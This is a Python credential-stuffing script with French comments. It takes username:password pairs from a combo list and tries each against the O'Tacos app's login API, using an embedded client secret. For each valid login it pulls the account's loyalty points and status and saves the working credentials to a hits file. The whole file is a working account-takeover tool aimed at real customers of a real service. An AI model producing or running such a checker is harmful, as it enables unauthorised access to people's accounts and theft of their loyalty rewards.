import requests
import json
from colorama import Fore, init
import threading

init(autoreset=True)

print(Fore.LIGHTYELLOW_EX + ' $$$$$$\  $$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  ')
print(Fore.LIGHTBLUE_EX + '$$  __$$\ $  |\__$$  __|$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ ')
print(Fore.LIGHTCYAN_EX + '$$ /  $$ |\_/    $$ |   $$ /  $$ |$$ /  \__|$$ /  $$ |$$ /  \__|')
print(Fore.LIGHTGREEN_EX + '$$ |  $$ |       $$ |   $$$$$$$$ |$$ |      $$ |  $$ |\$$$$$$\  ')
print(Fore.LIGHTMAGENTA_EX + '$$ |  $$ |       $$ |   $$  __$$ |$$ |      $$ |  $$ | \____$$\ ')
print(Fore.LIGHTRED_EX + '$$ |  $$ |       $$ |   $$ |  $$ |$$ |  $$\ $$ |  $$ |$$\   $$ |')
print(Fore.LIGHTWHITE_EX + ' $$$$$$  |       $$ |   $$ |  $$ |\$$$$$$  | $$$$$$  |\$$$$$$  |')
print(Fore.LIGHTYELLOW_EX + ' \______/        \__|   \__|  \__| \______/  \______/  \______/ ')
print('                                                                ')
print(Fore.LIGHTRED_EX + '                    Developpé par ATZ                           ')
print('                                                                ')
def check(combo): #definir la fonction check en fonction de combo
    username = combo.split(":")[0].strip() #partie avant le :
    password = combo.split(":")[1].strip() #apres le :

    url = "https://api.flyx.cloud/otacos/app/Connect/Token" #url
    
    dataa = { #données post
        "grant_type": "password",
        "username": username,
        "password": password,
        "client_id": "app",
        "client_secret": "1QQ2CRDBOHVTSK5R6ZLFWJ7WQUCCM",
        "scope": "ordering_api app_api identity_api payment_api offline_access openid"
    }

    
    response = requests.post(url, data=dataa) #la on fait la requete post

    if "access_token" in response.text: #keycheck
        response_json = json.loads(response.text) #recupere le texte de la reponse
        access_token = response_json["access_token"] #recupere acces token de la reponse

        url2 = "https://api.flyx.cloud/otacos/app/api/User" #lien pour la capture

        headers = {
        "Authorization": f"Bearer {access_token}", #f pour fonction comme ca {}
        "Host": "api.flyx.cloud",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "O'Tacos/12 CFNetwork/1390 Darwin/22.0.0",
        "Accept-Language": "fr-FR,fr;q=0.9"
    }
        response = requests.get(url2, headers=headers) #requete get pour la capture
        response_json = json.loads(response.text) #recupere le texte
        points = response_json['data']['loyaltyCard']['points'] #chemin data puis loyalty card puis points
        advanced = response_json['data']['isAdvanced'] # pareil qu'en haut
        print(Fore.GREEN + f"{username}:{password} | Points: {points} | Advanced = {advanced}") #simple mdr
        with open('hits.txt', 'a') as file: #save dans le hits.txt
                file.write(f"{username}:{password} | Points: {points} | Advanced = {advanced}\n")

    if "Username or password is incorrect" in response.text: #keycheck bad
        print(Fore.RED + f"{username}:{password} | BAD")
    
combo = open('combo.txt').readlines() # recup combo

for ligne in combo: #pour chaque ligne, fonction check
    check(ligne)